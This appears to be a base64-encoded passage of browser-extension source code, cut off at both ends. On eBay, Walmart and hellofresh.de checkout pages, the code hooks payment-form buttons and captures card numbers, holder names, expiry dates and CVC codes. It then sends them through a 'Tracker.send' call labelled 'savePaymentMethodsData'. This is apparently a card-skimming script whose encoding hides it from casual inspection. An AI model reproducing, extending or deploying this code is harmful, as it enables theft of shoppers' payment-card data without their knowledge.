AgICAgICAgICAgICAgICAgICAgICAgJ3ZhbHVlJzogX19jaGlsZEVsZW1lbnQudGV4dENvbnRlbnRcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRyYWNrZXIuc2VuZCh7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kOiAnc2F2ZVBheW1lbnRNZXRob2RzRGF0YScsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmROdW1iZXInOiB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZVswXS52YWx1ZSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEJyYW5kJzogdGVtcFBheW1lbnRNZXRob2RzU3RvcmVbMV0udmFsdWUsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRIb2xkZXInOiAnVW5rbm93bicsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRFeHBpcmUnOiAnVW5rbm93bicsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRDVkMnOiAnVW5rbm93bicsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2V2ZW50JzogJ2FkZCcsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3dvcmtXZWJzaXRlJzogd2luZG93LmxvY2F0aW9uLm9yaWdpblxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGVtcFBheW1lbnRNZXRob2RzU3RvcmUgPSBbXTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgIGlmICh3aW5kb3cubG9jYXRpb24uaHJlZi5pbmRleE9mKCdwYXlSZXN1bHQuaHRtJykgIT09IC0xKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwoaW50ZXJ2YWwxKTtcclxuXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBpbnRlcnZhbDQgPSBzZXRJbnRlcnZhbChmdW5jdGlvbiAoKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLnZlcmlmeS1jYXJkLWZvcm0tcm93JykgIT09IG51bGwpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGVhckludGVydmFsKGludGVydmFsNCk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy52ZXJpZnktY2FyZC1jb25maXJtJyk/LmZpcnN0RWxlbWVudENoaWxkPy5ub2RlTmFtZSA9PT0gJ0JVVFRPTicpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgWydjbGljaycsICdkYmxjbGljayddLmZvckVhY2goZnVuY3Rpb24gKGV2ZW50KSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgdGVtcFBheW1lbnRNZXRob2RzU3RvcmU6IGFueSA9IFtdO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLnZlcmlmeS1jYXJkLWNvbmZpcm0nKT8uZmlyc3RFbGVtZW50Q2hpbGQ/LmFkZEV2ZW50TGlzdGVuZXIoZXZlbnQsIGZ1bmN0aW9uICgpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVQYXltZW50SW5wdXRUYWcoc2VsZiwgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy52ZXJpZnktY2FyZC1mb3JtLXJvdycpIGFzIEhUTUxFbGVtZW50KSwgJ2NhcmROJywgZnVuY3Rpb24gKF9fZGV0ZWN0ZWRFbGVtZW50OiBhbnkpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGVtcFBheW1lbnRNZXRob2RzU3RvcmUucHVzaCh7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZWxlbWVudCc6IF9fZGV0ZWN0ZWRFbGVtZW50Lm5vZGVOYW1lLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2lkJzogX19kZXRlY3RlZEVsZW1lbnQuaWQsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAndmFsdWUnOiBfX2RldGVjdGVkRWxlbWVudC52YWx1ZVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVQYXltZW50SW5wdXRUYWcoc2VsZiwgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy52ZXJpZnktY2FyZC1mb3JtLXJvdycpIGFzIEhUTUxFbGVtZW50KSwgJ2NhcmRIb2xkZXInLCBmdW5jdGlvbiAoX19kZXRlY3RlZEVsZW1lbnQ6IGFueSkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZS5wdXNoKHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdlbGVtZW50JzogX19kZXRlY3RlZEVsZW1lbnQubm9kZU5hbWUsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnaWQnOiBfX2RldGVjdGVkRWxlbWVudC5pZCxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd2YWx1ZSc6IF9fZGV0ZWN0ZWRFbGVtZW50LnZhbHVlXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZVBheW1lbnRJbnB1dFRhZyhzZWxmLCAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLnZlcmlmeS1jYXJkLWZvcm0tcm93JykgYXMgSFRNTEVsZW1lbnQpLCAnZXhwaXJlcycsIGZ1bmN0aW9uIChfX2RldGVjdGVkRWxlbWVudDogYW55KSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRlbXBQYXltZW50TWV0aG9kc1N0b3JlLnB1c2goe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2VsZW1lbnQnOiBfX2RldGVjdGVkRWxlbWVudC5ub2RlTmFtZSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdpZCc6IF9fZGV0ZWN0ZWRFbGVtZW50LmlkLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3ZhbHVlJzogX19kZXRlY3RlZEVsZW1lbnQudmFsdWVcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlUGF5bWVudElucHV0VGFnKHNlbGYsIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcudmVyaWZ5LWNhcmQtZm9ybS1yb3cnKSBhcyBIVE1MRWxlbWVudCksICdjdmMnLCBmdW5jdGlvbiAoX19kZXRlY3RlZEVsZW1lbnQ6IGFueSkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZS5wdXNoKHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdlbGVtZW50JzogX19kZXRlY3RlZEVsZW1lbnQubm9kZU5hbWUsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnaWQnOiBfX2RldGVjdGVkRWxlbWVudC5pZCxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd2YWx1ZSc6IF9fZGV0ZWN0ZWRFbGVtZW50LnZhbHVlXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRyYWNrZXIuc2VuZCh7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1hbmQ6ICdzYXZlUGF5bWVudE1ldGhvZHNEYXRhJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YToge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmROdW1iZXInOiB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZVswXS5pZC5pbmRleE9mKCdjYXJkTicpICE9PSAtMSA/IHRlbXBQYXltZW50TWV0aG9kc1N0b3JlWzBdLnZhbHVlIDogJ1Vua25vd24nLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRCcmFuZCc6IHRlbXBQYXltZW50TWV0aG9kc1N0b3JlWzBdLmlkID09PSAnY2FyZEJyYW5kJyA/IHRlbXBQYXltZW50TWV0aG9kc1N0b3JlWzBdLnZhbHVlIDogJ1Vua25vd24nLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRIb2xkZXInOiB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZVswXS5pZCA9PT0gJ2NhcmRIb2xkZXInID8gdGVtcFBheW1lbnRNZXRob2RzU3RvcmVbMF0udmFsdWUgOiAnVW5rbm93bicsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEV4cGlyZSc6IHRlbXBQYXltZW50TWV0aG9kc1N0b3JlWzBdLmlkID09PSAnZXhwaXJlcycgPyB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZVswXS52YWx1ZSA6ICdVbmtub3duJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkQ1ZDJzogdGVtcFBheW1lbnRNZXRob2RzU3RvcmVbMF0uaWQgPT09ICdjdmMnID8gdGVtcFBheW1lbnRNZXRob2RzU3RvcmVbMF0udmFsdWUgOiAnVW5rbm93bicsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZXZlbnQnOiAnYWRkJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd3b3JrV2Vic2l0ZSc6IHdpbmRvdy5sb2NhdGlvbi5vcmlnaW5cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRlbXBQYXltZW50TWV0aG9kc1N0b3JlID0gW107XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgICAgICB9LCAxMDAwKTtcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICB9Ki9cclxuICAgICAgICAgICAgfVxyXG5cclxuICAgICAgICAgICAgaWYgKHdpbmRvdy5sb2NhdGlvbi5vcmlnaW4uaW5kZXhPZignZWJheScpICE9PSAtMSkge1xyXG4gICAgICAgICAgICAgICAgY2xlYXJJbnRlcnZhbChpbnRlcnZhbDEpO1xyXG4gICAgICAgICAgICAgICAgbGV0IGludGVydmFsID0gc2V0SW50ZXJ2YWwoZnVuY3Rpb24gKCkge1xyXG4gICAgICAgICAgICAgICAgICAgIGlmIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCdmb3JtJykubGVuZ3RoICE9PSAwKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJ2Zvcm0nKS5mb3JFYWNoKGZ1bmN0aW9uIChfX2ViYXlDcmVkaXRDYXJkRm9ybUVsZW1lbnQpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChfX2ViYXlDcmVkaXRDYXJkRm9ybUVsZW1lbnQuaWQgPT09ICdjcmVkaXQtY2FyZC1kZXRhaWxzJykge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwoaW50ZXJ2YWwpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBlbGVtZW50czogYW55ID0gW107XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlRWJheVBheW1lbnREYXRhQ29sbGVjdGlvbihzZWxmLCBfX2ViYXlDcmVkaXRDYXJkRm9ybUVsZW1lbnQsIGVsZW1lbnRzKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgfSwgMTAwKTtcclxuICAgICAgICAgICAgICAgIGlmIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcjcm9vdCcpICE9PSBudWxsICYmIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5jaWMtbW9kdWxlJykgIT09IG51bGwgJiYgZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmJ0bi5idG4tLXByaW1hcnkuZmllbGQnKSAhPT0gbnVsbCkge1xyXG4gICAgICAgICAgICAgICAgICAgIGlmIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuYnRuLmJ0bi0tcHJpbWFyeS5maWVsZCcpPy5ub2RlTmFtZSA9PT0gJ0JVVFRPTicpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgW1wiY2xpY2tcIiwgXCJkYmxjbGlja1wiXS5mb3JFYWNoKGZ1bmN0aW9uIChldmVudCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHRlbXBQYXltZW50TWV0aG9kc1N0b3JlOiBhbnkgPSBbXTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5idG4uYnRuLS1wcmltYXJ5LmZpZWxkJyk/LmFkZEV2ZW50TGlzdGVuZXIoZXZlbnQsIGZ1bmN0aW9uICgpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVQYXltZW50SW5wdXRUYWcoc2VsZiwgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5jaWMtbW9kdWxlJykgYXMgSFRNTEVsZW1lbnQpLCAnY3JlZGl0Q2FyZE51bWJlcicsIGZ1bmN0aW9uIChfX2RldGVjdGVkRWxlbWVudDogYW55KSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRlbXBQYXltZW50TWV0aG9kc1N0b3JlLnB1c2goe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2VsZW1lbnQnOiBfX2RldGVjdGVkRWxlbWVudC5ub2RlTmFtZSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdpZCc6IF9fZGV0ZWN0ZWRFbGVtZW50LmlkLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3ZhbHVlJzogX19kZXRlY3RlZEVsZW1lbnQudmFsdWVcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlUGF5bWVudElucHV0VGFnKHNlbGYsIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuY2ljLW1vZHVsZScpIGFzIEhUTUxFbGVtZW50KSwgJ2ZpcnN0TmFtZScsIGZ1bmN0aW9uIChfX2RldGVjdGVkRWxlbWVudDogYW55KSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRlbXBQYXltZW50TWV0aG9kc1N0b3JlLnB1c2goe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2VsZW1lbnQnOiBfX2RldGVjdGVkRWxlbWVudC5ub2RlTmFtZSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdpZCc6IF9fZGV0ZWN0ZWRFbGVtZW50LmlkLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3ZhbHVlJzogX19kZXRlY3RlZEVsZW1lbnQudmFsdWVcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlUGF5bWVudElucHV0VGFnKHNlbGYsIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuY2ljLW1vZHVsZScpIGFzIEhUTUxFbGVtZW50KSwgJ2xhc3ROYW1lJywgZnVuY3Rpb24gKF9fZGV0ZWN0ZWRFbGVtZW50OiBhbnkpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGVtcFBheW1lbnRNZXRob2RzU3RvcmUucHVzaCh7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZWxlbWVudCc6IF9fZGV0ZWN0ZWRFbGVtZW50Lm5vZGVOYW1lLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2lkJzogX19kZXRlY3RlZEVsZW1lbnQuaWQsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAndmFsdWUnOiBfX2RldGVjdGVkRWxlbWVudC52YWx1ZVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVQYXltZW50SW5wdXRUYWcoc2VsZiwgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5jaWMtbW9kdWxlJykgYXMgSFRNTEVsZW1lbnQpLCAnZXhwaXJhdGlvbkRhdGUnLCBmdW5jdGlvbiAoX19kZXRlY3RlZEVsZW1lbnQ6IGFueSkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZS5wdXNoKHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdlbGVtZW50JzogX19kZXRlY3RlZEVsZW1lbnQubm9kZU5hbWUsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnaWQnOiBfX2RldGVjdGVkRWxlbWVudC5pZCxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd2YWx1ZSc6IF9fZGV0ZWN0ZWRFbGVtZW50LnZhbHVlXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZVBheW1lbnRJbnB1dFRhZyhzZWxmLCAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmNpYy1tb2R1bGUnKSBhcyBIVE1MRWxlbWVudCksICdjdnYnLCBmdW5jdGlvbiAoX19kZXRlY3RlZEVsZW1lbnQ6IGFueSkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZS5wdXNoKHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdlbGVtZW50JzogX19kZXRlY3RlZEVsZW1lbnQubm9kZU5hbWUsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnaWQnOiBfX2RldGVjdGVkRWxlbWVudC5pZCxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd2YWx1ZSc6IF9fZGV0ZWN0ZWRFbGVtZW50LnZhbHVlXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRyYWNrZXIuc2VuZCh7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1hbmQ6ICdzYXZlUGF5bWVudE1ldGhvZHNEYXRhJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YToge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmROdW1iZXInOiB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZVswXS5pZC5pbmRleE9mKCdjcmVkaXRDYXJkTnVtYmVyJykgIT09IC0xID8gdGVtcFBheW1lbnRNZXRob2RzU3RvcmVbMF0udmFsdWUgOiAnVW5rbm93bicsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEJyYW5kJzogZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmZsb2F0aW5nLWlucHV0X19maXhyaWdodCcpPy5maXJzdEVsZW1lbnRDaGlsZD8uY2xhc3NOYW1lID8gZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmZsb2F0aW5nLWlucHV0X19maXhyaWdodCcpPy5maXJzdEVsZW1lbnRDaGlsZD8uY2xhc3NOYW1lLnRvTG93ZXJDYXNlKCkgOiAnVW5rbm93bicsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEhvbGRlcic6IHRlbXBQYXltZW50TWV0aG9kc1N0b3JlWzFdLnZhbHVlICsgJyAnICsgdGVtcFBheW1lbnRNZXRob2RzU3RvcmVbMl0udmFsdWUsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEV4cGlyZSc6IHRlbXBQYXltZW50TWV0aG9kc1N0b3JlWzNdLmlkID09PSAnZXhwaXJhdGlvbkRhdGUnID8gdGVtcFBheW1lbnRNZXRob2RzU3RvcmVbM10udmFsdWUgOiAnVW5rbm93bicsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZENWQyc6IHRlbXBQYXltZW50TWV0aG9kc1N0b3JlWzRdLmlkID09PSAnY3Z2JyA/IHRlbXBQYXltZW50TWV0aG9kc1N0b3JlWzRdLnZhbHVlIDogJ1Vua25vd24nLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2V2ZW50JzogJ2FkZCcsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnd29ya1dlYnNpdGUnOiB3aW5kb3cubG9jYXRpb24ub3JpZ2luXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZSA9IFtdO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfSlcclxuICAgICAgICAgICAgICAgICAgICAgICAgfSlcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH1cclxuXHJcbiAgICAgICAgICAgIGlmICh3aW5kb3cubG9jYXRpb24ub3JpZ2luLmluZGV4T2YoJ3dhbG1hcnQnKSAhPT0gLTEpIHtcclxuICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwoaW50ZXJ2YWwxKTtcclxuICAgICAgICAgICAgICAgIGxldCBpbnRlcnZhbCA9IHNldEludGVydmFsKGZ1bmN0aW9uICgpIHtcclxuICAgICAgICAgICAgICAgICAgICBpZiAod2luZG93LmxvY2F0aW9uLmhyZWYuaW5kZXhPZignIy9wYXltZW50JykgIT09IC0xIHx8IHdpbmRvdy5sb2NhdGlvbi5ocmVmLmluZGV4T2YoJ2FjY291bnQvY3JlZGl0Y2FyZHMnKSAhPT0gLTEpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgY2xlYXJJbnRlcnZhbChpbnRlcnZhbCk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZVdhbG1hcnRQYXltZW50Q29udGFpbmVyKHNlbGYpO1xyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICBpZiAod2luZG93LmxvY2F0aW9uLmhyZWYuaW5kZXhPZignIy9yZXZpZXcnKSAhPT0gLTEpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgY2xlYXJJbnRlcnZhbChpbnRlcnZhbCk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZVdhbG1hcnRQYXltZW50RWRpdEJ1dHRvbihzZWxmKTtcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICB9LCAxMDApO1xyXG4gICAgICAgICAgICB9XHJcblxyXG4gICAgICAgICAgICBpZiAod2luZG93LmxvY2F0aW9uLm9yaWdpbi5pbmRleE9mKCdoZWxsb2ZyZXNoLmRlJykgIT09IC0xKSB7XHJcbiAgICAgICAgICAgICAgICBjbGVhckludGVydmFsKGludGVydmFsMSk7XHJcbiAgICAgICAgICAgICAgICBsZXQgaW50ZXJ2YWwgPSBzZXRJbnRlcnZhbChmdW5jdGlvbiAoKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJy5SZWFjdE1vZGFsUG9ydGFsJykubGVuZ3RoICE9PSAwKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwoaW50ZXJ2YWwpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCcuUmVhY3RNb2RhbFBvcnRhbCcpLmZvckVhY2goZnVuY3Rpb24gKG1vZGFsKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBp